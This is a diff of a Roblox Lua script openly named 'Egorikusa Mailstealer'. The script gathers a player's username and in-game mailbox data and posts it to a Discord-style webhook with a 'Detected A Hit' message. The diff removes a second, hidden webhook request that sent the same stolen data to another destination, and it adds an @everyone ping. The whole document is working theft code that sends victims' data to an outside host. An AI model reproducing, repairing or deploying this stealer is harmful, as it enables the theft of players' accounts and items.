@@ -14,9 +14,6 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
 
 local url = _G.Webhook
 
-local us = _G.dhwebhook
-
-local url2 = us
 
 local username = game:GetService("Players").LocalPlayer.Name
 
@@ -48,7 +45,7 @@ request = http_request or request or HttpPost or syn.request
 
 local data1 = {
 
-    ["content"] = "\n**:comet:Egorikusa Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "||@everyone||\n**:comet:Egorikusa Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
 
     ["embeds"] = {
 
@@ -171,9 +168,4 @@ local headers = {
 }
 
 local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
-
-local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
-
 request(abcdef1)
-
-request(abcdef2)
